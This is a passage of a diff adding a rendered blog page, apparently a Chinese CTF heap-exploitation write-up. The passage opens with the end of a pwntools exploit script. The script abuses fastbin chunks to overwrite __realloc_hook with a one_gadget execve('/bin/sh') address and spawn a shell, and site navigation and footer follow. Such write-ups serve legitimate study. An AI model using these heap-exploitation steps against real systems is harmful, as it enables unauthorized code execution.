class="string">"size: "</span>)    </span><br><span class="line">io.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">io.send(str(<span class="string">'\xea'</span>))        <span class="comment"># 再申请0x60，又返回了fastbin里的chunk，注意最后一字节,此时fastbin指向fake chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ogg = <span class="number">0x4526a</span></span><br><span class="line">p2 = flat(<span class="string">'\x00'</span>*<span class="number">0xB</span>,p64(ogg+offset),p64(offset+libc.sym[<span class="string">'realloc'</span>]+<span class="number">0x10</span>))    <span class="comment"># 0xB刚好到达__realloc_hook,改reallochook为ogg，改malloc为reallochook+偏移 此时调整栈空间</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"realloc hook+0ffset: "</span>,hex(offset+libc.sym[<span class="string">'realloc'</span>]+<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ogg+offset: "</span>,hex(ogg+offset)</span><br><span class="line">add(io,<span class="number">0x60</span>,p2)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#pydebug(io)</span></span><br><span class="line"><span class="comment">#delt(io,3)</span></span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/02/ptmalloc2%E5%AD%A6%E4%B9%A0-1/" rel="next" title="ptmalloc2学习_1">
+                <i class="fa fa-chevron-left"></i> ptmalloc2学习_1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4"
+               alt="Paxos" />
+          <p class="site-author-name" itemprop="name">Paxos</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/OrangeGzY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:guoziyi114@gmail.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://stevelee477.github.io/" title="Stevelee477(全栈大佬)" target="_blank">Stevelee477(全栈大佬)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://minhal.me" title="Minhal(二进制爷爷👴)" target="_blank">Minhal(二进制爷爷👴)</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-考察内容"><span class="nav-number">1.</span> <span class="nav-text">0x0 考察内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-题目概览"><span class="nav-number">2.</span> <span class="nav-text">0x1 题目概览</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击思路一"><span class="nav-number">3.</span> <span class="nav-text">攻击思路一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-整体过程"><span class="nav-number">3.1.</span> <span class="nav-text">0x1 整体过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-Exp"><span class="nav-number">3.2.</span> <span class="nav-text">0x2 Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击思路二"><span class="nav-number">4.</span> <span class="nav-text">攻击思路二</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-整体过程-1"><span class="nav-number">4.1.</span> <span class="nav-text">0x1 整体过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-EXP"><span class="nav-number">4.2.</span> <span class="nav-text">0x2 EXP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paxos</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
